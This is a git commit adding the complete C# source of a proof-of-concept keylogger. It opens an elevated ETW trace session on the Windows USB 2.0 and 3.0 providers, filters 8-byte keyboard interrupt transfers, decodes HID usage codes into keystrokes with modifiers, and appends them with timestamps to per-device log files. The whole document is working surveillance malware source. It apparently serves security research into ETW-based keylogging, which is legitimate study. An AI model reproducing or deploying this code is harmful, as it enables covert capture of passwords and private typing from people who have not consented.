7ce14a35da8b036e51faea6d09700d6d107a81e4
chusta <chua.stan@gmail.com>
2016-10-18 11:23:39 -0700

    initial

---
+++ KeyloggerPOC/KeyloggerPOC/KeyMap.cs
@@ -0,0 +1,192 @@
+﻿namespace EtwKeylogger
+{
+    // hxxp://www.usb.org/developers/hidpage/Hut1_12v2.pdf
+    public class KeyMap
+    {
+        public static string[] GetKey(int value)
+        {
+            switch (value)
+            {
+                /*
+                case 0x00: return new[] { "Reserved" };
+                case 0x01: return new[] { "ErrorRollOver" };
+                case 0x02: return new[] { "POSTFail" };
+                case 0x03: return new[] { "ErrorUndefined" };
+                */
+                case 0x00: return new string[1]; // unused
+                case 0x04: return new[] { "a", "A" };
+                case 0x05: return new[] { "b", "B" };
+                case 0x06: return new[] { "c", "C" };
+                case 0x07: return new[] { "d", "D" };
+                case 0x08: return new[] { "e", "E" };
+                case 0x09: return new[] { "f", "F" };
+                case 0x0A: return new[] { "g", "G" };
+                case 0x0B: return new[] { "h", "H" };
+                case 0x0C: return new[] { "i", "I" };
+                case 0x0D: return new[] { "j", "J" };
+                case 0x0E: return new[] { "k", "K" };
+                case 0x0F: return new[] { "l", "L" };
+                case 0x10: return new[] { "m", "M" };
+                case 0x11: return new[] { "n", "N" };
+                case 0x12: return new[] { "o", "O" };
+                case 0x13: return new[] { "p", "P" };
+                case 0x14: return new[] { "q", "Q" };
+                case 0x15: return new[] { "r", "R" };
+                case 0x16: return new[] { "s", "S" };
+                case 0x17: return new[] { "t", "T" };
+                case 0x18: return new[] { "u", "U" };
+                case 0x19: return new[] { "v", "V" };
+                case 0x1A: return new[] { "w", "W" };
+                case 0x1B: return new[] { "x", "X" };
+                case 0x1C: return new[] { "y", "Y" };
+                case 0x1D: return new[] { "z", "Z" };
+                case 0x1E: return new[] { "1", "!" };
+                case 0x1F: return new[] { "2", "@" };
+                case 0x20: return new[] { "3", "#" };
+                case 0x21: return new[] { "4", "$" };
+                case 0x22: return new[] { "5", "%" };
+                case 0x23: return new[] { "6", "^" };
+                case 0x24: return new[] { "7", "&" };
+                case 0x25: return new[] { "8", "*" };
+                case 0x26: return new[] { "9", "(" };
+                case 0x27: return new[] { "0", ")" };
+                case 0x28: return new[] { "[RET]" };
+                case 0x29: return new[] { "[ESC]" };
+                case 0x2A: return new[] { "[DEL]" };
+                case 0x2B: return new[] { "[TAB]" };
+                case 0x2C: return new[] { "[SPACE]" };
+                case 0x2D: return new[] { "-", "_" };
+                case 0x2E: return new[] { "=", "+" };
+                case 0x2F: return new[] { "[", "{" };
+                case 0x30: return new[] { "]", "}" };
+                case 0x31: return new[] { "\\", "|" };
+                case 0x32: return new[] { "#", "~" };       //non-US
+                case 0x33: return new[] { ";", ":" };
+                case 0x34: return new[] { "\'", "\"" };
+                case 0x35: return new[] { "`", "~" };
+                case 0x36: return new[] { ";", "<" };
+                case 0x37: return new[] { ".", ">" };
+                case 0x38: return new[] { "/", "?" };
+                case 0x39: return new[] { "[CAPS]" };
+                case 0x3A: return new[] { "[F1]" };
+                case 0x3B: return new[] { "[F2]" };
+                case 0x3C: return new[] { "[F3]" };
+                case 0x3D: return new[] { "[F4]" };
+                case 0x3E: return new[] { "[F5]" };
+                case 0x3F: return new[] { "[F6]" };
+                case 0x40: return new[] { "[F7]" };
+                case 0x41: return new[] { "[F8]" };
+                case 0x42: return new[] { "[F9]" };
+                case 0x43: return new[] { "[F10]" };
+                case 0x44: return new[] { "[F11]" };
+                case 0x45: return new[] { "[F12]" };
+                case 0x46: return new[] { "[PRT]" };
+                case 0x47: return new[] { "[SCL]" };
+                case 0x48: return new[] { "[PAU]" };
+                case 0x49: return new[] { "[INS]" };
+                case 0x4A: return new[] { "[HOME]" };
+                case 0x4B: return new[] { "[P-UP]" };
+                case 0x4C: return new[] { "[FWD]" };
+                case 0x4D: return new[] { "[END]" };
+                case 0x4E: return new[] { "[P-DN]" };
+                case 0x4F: return new[] { "[RT]" };
+                case 0x50: return new[] { "[LT]" };
+                case 0x51: return new[] { "[DN]" };
+                case 0x52: return new[] { "[UP]" };
+                case 0x53: return new[] { "[NUM]", "[CLR]" };
+                case 0x54: return new[] { "/" };
+                case 0x55: return new[] { "*" };
+                case 0x56: return new[] { "-" };
+                case 0x57: return new[] { "+" };
+                case 0x58: return new[] { "[ENTER]" };
+                case 0x59: return new[] { "1", "[END]" };
+                case 0x5A: return new[] { "2", "[DN]" };
+                case 0x5B: return new[] { "3", "[P-DN]" };
+                case 0x5C: return new[] { "4", "[LT]" };
+                case 0x5D: return new[] { "5" };
+                case 0x5E: return new[] { "6", "[RT]" };
+                case 0x5F: return new[] { "7", "[HOME]" };
+                case 0x60: return new[] { "8", "[UP]" };
+                case 0x61: return new[] { "9", "[P-UP]" };
+                case 0x62: return new[] { "0", "[INS]" };
+                case 0x63: return new[] { ".", "[DEL]" };
+                case 0x64: return new[] { "\\", "|" };      //non-US
+                /*
+                case 0x65: return new[] { "[Application]" };
+                case 0x66: return new[] { "[Power]" };
+                case 0x67: return new[] { "=" };
+                case 0x68: return new[] { "[F13]" };
+                case 0x69: return new[] { "[F14]" };
+                case 0x6A: return new[] { "[F15]" };
+                case 0x6B: return new[] { "[F16]" };
+                case 0x6C: return new[] { "[F17]" };
+                case 0x6D: return new[] { "[F18]" };
+                case 0x6E: return new[] { "[F19]" };
+                case 0x6F: return new[] { "[F20]" };
+                case 0x70: return new[] { "[F21]" };
+                case 0x71: return new[] { "[F22]" };
+                case 0x72: return new[] { "[F23]" };
+                case 0x73: return new[] { "[F24]" };
+                case 0x74: return new[] { "[Execute]" };
+                case 0x75: return new[] { "[Help]" };
+                case 0x76: return new[] { "[Menu]" };
+                case 0x77: return new[] { "[Select]" };
+                case 0x78: return new[] { "[Stop]" };
+                case 0x79: return new[] { "[Again]" };
+                case 0x7A: return new[] { "[Undo]" };
+                case 0x7B: return new[] { "[Cut]" };
+                case 0x7C: return new[] { "[Copy]" };
+                case 0x7D: return new[] { "[Paste]" };
+                case 0x7E: return new[] { "[Find]" };
+                case 0x7F: return new[] { "[Mute]" };
+                case 0x80: return new[] { "[VolumeUp]" };
+                case 0x81: return new[] { "[VolumeDown]" };
+                case 0x82: return new[] { "[CapsLock]" };     //locking
+                case 0x83: return new[] { "[NumLock]" };      //locking
+                case 0x84: return new[] { "[ScrollLock]" };   //locking
+                case 0x85: return new[] { ";" };
+                case 0x86: return new[] { "=" };
+                case 0x87: return new[] { "[Intl1]" };
+                case 0x88: return new[] { "[Intl2]" };
+                case 0x89: return new[] { "[Intl3]" };
+                case 0x8A: return new[] { "[Intl4]" };
+                case 0x8B: return new[] { "[Intl5]" };
+                case 0x8C: return new[] { "[Intl6]" };
+                case 0x8D: return new[] { "[Intl7]" };
+                case 0x8E: return new[] { "[Intl8]" };
+                case 0x8F: return new[] { "[Intl9]" };
+                case 0x90: return new[] { "[LANG1]" };
+                case 0x91: return new[] { "[LANG2]" };
+                case 0x92: return new[] { "[LANG3]" };
+                case 0x93: return new[] { "[LANG4]" };
+                case 0x94: return new[] { "[LANG5]" };
+                case 0x95: return new[] { "[LANG6]" };
+                case 0x96: return new[] { "[LANG7]" };
+                case 0x97: return new[] { "[LANG8]" };
+                case 0x98: return new[] { "[LANG9]" };
+                case 0x99: return new[] { "[Erase]" };        //alternate
+                case 0x9A: return new[] { "[SysReq]" };
+                case 0x9B: return new[] { "[Cancel]" };
+                case 0x9C: return new[] { "[Clear]" };
+                case 0x9D: return new[] { "[Prior]" };
+                case 0x9E: return new[] { "[Return]" };
+                case 0x9F: return new[] { "[Separator]" };
+                case 0xA0: return new[] { "[Out]" };
+                case 0xA1: return new[] { "[Oper]" };
+                case 0xA2: return new[] { "[Clear]" };        //again
+                case 0xA3: return new[] { "[CrSel]" };        //props
+                case 0xA4: return new[] { "[ExSel]" };
+                case 0xE0: return new[] { "[LtCtrl]" };
+                case 0xE1: return new[] { "[LtShift]" };
+                case 0xE2: return new[] { "[LtAlt]" };
+                case 0xE3: return new[] { "[LtGUI]" };
+                case 0xE4: return new[] { "[RtControl]" };
+                case 0xE5: return new[] { "[RtShift]" };
+                case 0xE6: return new[] { "[RtAlt]" };
+                case 0xE7: return new[] { "[RtGUI]" };
+                */
+                default: return null;
+            }
+        }
+    }
+}
---
+++ KeyloggerPOC/KeyloggerPOC/Keylogger.cs
@@ -0,0 +1,367 @@
+﻿using System;
+using System.IO;
+using System.Linq;
+using System.Collections.Generic;
+using Microsoft.Diagnostics.Tracing;
+using Microsoft.Diagnostics.Tracing.Session;
+using System.Threading.Tasks;
+
+namespace EtwKeylogger
+{
+    public class UsbData
+    {
+        public byte[] data;
+        public ulong hndl;
+        public DateTime time;
+
+        public UsbData(DateTime inputTime, ulong inputHndl, byte[] inputData)
+        {
+            time = inputTime;
+            data = inputData;
+            hndl = inputHndl;
+        }
+    }
+
+    public class UsbEventSource
+    {
+        // Microsoft-Windows-USB-UCX (usb3.0)
+        private static Guid UsbUcx = new Guid("36DA592D-E43A-4E28-AF6F-4BC57C5A11E8");
+        // Microsoft-Windows-USB-USBPORT (usb2.0)
+        private static Guid UsbPort = new Guid("C88A4EF5-D048-4013-9408-E04B7DB2814A");
+
+        private static string sessionName = "UsbKeylog";
+        private static string dumpPath = Directory.GetCurrentDirectory() + "\\logs";
+
+        private static Queue<UsbData> datastore = new Queue<UsbData>();
+        private static HashSet<ulong> badHndls = new HashSet<ulong>();
+
+        public static void StartCapture(string newSessionName = null)
+        {
+            if (newSessionName != null)
+                sessionName = newSessionName;
+
+            using (var session = new TraceEventSession(sessionName))
+            {
+                if (TraceEventSession.IsElevated() != true)
+                {
+                    Console.Out.WriteLine("[!] run as admin");
+                    return;
+                }
+                SetupCtrlCHandler(() => { if (session != null) session.Stop(); });
+                session.Source.Dynamic.All += EventCallback;
+                session.EnableProvider(UsbUcx);
+                session.EnableProvider(UsbPort);
+                Console.WriteLine("starting capture ...");
+                session.Source.Process();
+            }
+        }
+
+        private static Dictionary<string, string> _expose(object hidden)
+        {
+            char[] separators = { '{', '}', ',' };
+            char[] remove = { ' ', '"' };
+            string[] s = hidden.ToString().Split(separators, StringSplitOptions.RemoveEmptyEntries);
+            Dictionary<string, string> item = s.ToDictionary(x => x.Split('=')[0].Trim(), x => x.Split('=')[1].Trim(remove));
+            return item;
+        }
+
+        private static object GetItem(TraceEvent eventData, string item)
+        {
+            object value = null;
+            int pIndex = eventData.PayloadIndex(item);
+            if (pIndex < 0)
+                return value;
+
+            try
+            {
+                value = eventData.PayloadValue(pIndex);
+            }
+            catch (ArgumentOutOfRangeException) {}
+
+            return value;
+        }
+
+        private static ulong FilterUsb2(TraceEvent eventData)
+        {
+            ulong hndl;
+            object field;
+
+            field = GetItem(eventData, "fid_USBPORT_Device");
+            Dictionary<string, string> deviceInfo = _expose(field);
+
+            if (!ulong.TryParse(deviceInfo["DeviceHandle"], out hndl) && hndl <= 0)
+                return 0;
+
+            field = GetItem(eventData, "fid_USBPORT_URB_BULK_OR_INTERRUPT_TRANSFER");
+            Dictionary<string, string> urb = _expose(field);
+
+            int xferDataSize = 0;
+            if (!int.TryParse(urb["fid_URB_TransferBufferLength"], out xferDataSize))
+                return 0;
+
+            // bug in traceevent (v1.0.41) parsing of USBPORT (usb2.0) urb data
+            //  this should be size 8 (according to microsoft message analyzer)
+            //  instead it is returned as size 34
+            if (xferDataSize != 34)
+                return 0;
+
+            return hndl;
+        }
+
+        private static ulong FilterUsb3(TraceEvent eventData)
+        {
+            ulong hndl = (ulong)GetItem(eventData, "fid_PipeHandle");
+            if (hndl <= 0)
+                return 0;
+
+            // retrieve raw urb data
+            object field = GetItem(eventData, "fid_UCX_URB_BULK_OR_INTERRUPT_TRANSFER");
+            Dictionary<string, string> urb = _expose(field);
+
+            // xfer buffer length is last n-bytes in eventData
+            int xferDataSize = 0;
+            if (!int.TryParse(urb["fid_URB_TransferBufferLength"], out xferDataSize))
+                return 0;
+
+            // usb keyboard xfer data is 8 bytes
+            if (xferDataSize != 8)
+                return 0;
+
+            return hndl;
+        }
+
+        // EventCallback - performs the following filtering of trace event data
+        //  1: check if there are any traceevent data
+        //  --- filter for usb2 or usb3 device (different urb fields)
+        //  2: check for usb bulk/interrupt transfers
+        //  3: check for designated non-zero handle for usb device
+        //  4: check for successful retrieval of urb data
+        //  --- parse urb data structure
+        //  5: check for successful parse of urb xfer buffer length
+        //  6: check xfer buffer length matches keyboard size
+        //  7: check that reserved byte is unused
+        //  8: check for non-empty keyboard data
+        //  9: check for out of order data
+        // 10: check for key rollover error
+        private static void EventCallback(TraceEvent eventData)
+        {
+            ulong hndl = 0;
+            if (eventData.EventDataLength <= 0)
+                return;
+
+            if (eventData.PayloadNames.Contains("fid_USBPORT_URB_BULK_OR_INTERRUPT_TRANSFER"))
+                hndl = FilterUsb2(eventData);
+            else if (eventData.PayloadNames.Contains("fid_UCX_URB_BULK_OR_INTERRUPT_TRANSFER"))
+                hndl = FilterUsb3(eventData);
+            else
+                return;
+
+            if (hndl == 0)
+                return;
+
+            byte[] xferData = new byte[8];
+            Array.Copy(eventData.EventData(), eventData.EventDataLength - 8, xferData, 0, 8);
+
+            // ignore reserved fields for keyboards
+            //  byte[1] must always be 0
+            if (xferData[1] != 0)
+                return;
+
+            // byte[2] to byte[8] contains standard keystrokes
+            if (xferData.Skip(2).SequenceEqual(new byte[6] { 0, 0, 0, 0, 0, 0 }))
+                return;
+
+            // if any byte[i] has 0, then following bytes must be 0
+            for (int i = 2; i < 8; i++)
+            {
+                if (xferData[i] == 0)
+                    for (int j = i; j < 6; j++)
+                        if (xferData[j] != 0)
+                            return;
+            }
+            
+            // keyboard rollover error
+            if (xferData.Skip(2).SequenceEqual(new byte[6] { 1, 1, 1, 1, 1, 1 }))
+                return;
+
+            datastore.Enqueue(new UsbData(eventData.TimeStamp, hndl, xferData));
+        }
+
+        private static bool isCtrlCExecuted;
+        private static ConsoleCancelEventHandler ctrlCHandler;
+        private static void SetupCtrlCHandler(Action action)
+        {
+            isCtrlCExecuted = false;
+            if (ctrlCHandler != null)
+                Console.CancelKeyPress -= ctrlCHandler;
+
+            ctrlCHandler = (object sender, ConsoleCancelEventArgs cancelArgs) =>
+            {
+                if (!isCtrlCExecuted)
+                {
+                    isCtrlCExecuted = true;
+                    Console.WriteLine("terminating ...");
+                    action();
+                    cancelArgs.Cancel = true;
+                }
+            };
+            Console.CancelKeyPress += ctrlCHandler;
+        }
+
+        private static string[] ParseKeys(byte[] bytes)
+        {
+            string[] result = new string[2];
+            result[0] = BitConverter.ToString(bytes).Replace("-", " ");
+
+            // modifiers:
+            //  CTL = 1
+            //  SFT = 2
+            //  ALT = 4
+            byte modByte = bytes[0];
+            byte noneByte = bytes[1];
+
+            byte[] dataBytes = new byte[6];
+            Array.Copy(bytes, 2, dataBytes, 0, 6);
+
+            string[] fullKeyStroke = new string[6];
+
+            // convert usageId -> usageName
+            for (int i = 0; i < fullKeyStroke.Length; i++)
+            {
+                int usageId = dataBytes[i];
+                string[] key = KeyMap.GetKey(usageId);
+
+                // skip unmapped data
+                if (key == null)
+                    return null;
+
+                // empty data (usageId == 0)
+                if (key.SequenceEqual(new string[1]))
+                {
+                    fullKeyStroke[i] = "";
+                    continue;
+                }
+
+                // [SFT]
+                if ((modByte & 0x02) != 0)
+                    fullKeyStroke[i] = key.Last();
+                else
+                    fullKeyStroke[i] = key.First();
+            }
+
+            string parsed = "";
+            if ((modByte & 0x01) != 0)
+                parsed += "[CTL] ";
+            if ((modByte & 0x04) != 0)
+                parsed += "[ALT] ";
+            parsed += String.Join(" ", fullKeyStroke);
+            result[1] = parsed.Trim();
+
+            return result;
+        }
+
+        private static void DumpKeys()
+        {
+            if (!Directory.Exists(dumpPath))
+                Directory.CreateDirectory(dumpPath);
+
+            List<UsbData> history = new List<UsbData>();
+
+            string[] result;
+            UsbData usb;
+            while(datastore.Count > 0)
+            {
+                usb = datastore.Dequeue();
+                if (badHndls.Contains(usb.hndl))
+                    continue;
+
+                // deduplicate keystrokes based on a sliding window
+                double threshold = 160;
+                if (history.Count > 0)
+                {
+                    HashSet<byte> duplicateBytes = new HashSet<byte>();
+                    List<UsbData> staleHistory = new List<UsbData>();
+
+                    double newTime = usb.time.TimeOfDay.TotalMilliseconds;
+
+                    // create a set of keys used by historical usb event data
+                    //  if data is deemed old, add to a staleHistory list
+                    //  for later pruning.
+                    foreach (UsbData usbOld in history)
+                    {
+                        double oldTime = usbOld.time.TimeOfDay.TotalMilliseconds;
+
+                        if (newTime - oldTime > threshold)
+                        {
+                            staleHistory.Add(usbOld);
+                            continue;
+                        }
+
+                        for (int i = 2; i < 8; i++)
+                            duplicateBytes.Add(usbOld.data[i]);
+                    }
+
+                    foreach (UsbData stale in staleHistory)
+                        history.Remove(stale);
+
+                    history.Add(usb);
+
+                    // zeroize duplicate bytes
+                    foreach (byte b in duplicateBytes)
+                    {
+                        if (b != 0 && usb.data.Contains(b))
+                        {
+                            int pos = Array.IndexOf(usb.data, b);
+                            usb.data[pos] = 0;
+                        }
+                    }
+
+                    // skip empty data, as a result of deduplication
+                    if (usb.data.Skip(2).SequenceEqual(new byte[6] { 0, 0, 0, 0, 0, 0 }))
+                        continue;
+                }
+                else
+                {
+                    history.Add(usb);
+                }
+
+                result = ParseKeys(usb.data);
+
+                // blacklist usb device which generates bad data
+                if (result == null)
+                {
+                    Console.WriteLine("[!] ignoring non-usb keyboard device: 0x{0:X}", usb.hndl);
+                    badHndls.Add(usb.hndl);
+                    continue;
+                }
+
+                string output = String.Join("\t\t", result).Trim();
+                string dt = usb.time.ToString("yyyyMMdd hh:mm:ss.fff");
+                string path = Path.Combine(dumpPath, String.Format("0x{0:X}", usb.hndl) + ".txt");
+
+                Console.WriteLine("{0}\t{1}", dt, output);
+                using (StreamWriter file = File.AppendText(path))
+                    file.WriteLine("{0}\t{1}", dt, output);
+            }
+        }
+
+        private static async void StartDumpKeys()
+        {
+            while (true)
+            {
+                DumpKeys();
+                await Task.Delay(100);
+            }
+        }
+
+        public static void Main(string[] args)
+        {
+            string session = null;
+            if (args.Length > 0)
+                session = args[0];
+
+            StartDumpKeys();
+            StartCapture(session);
+        }
+    }
+}
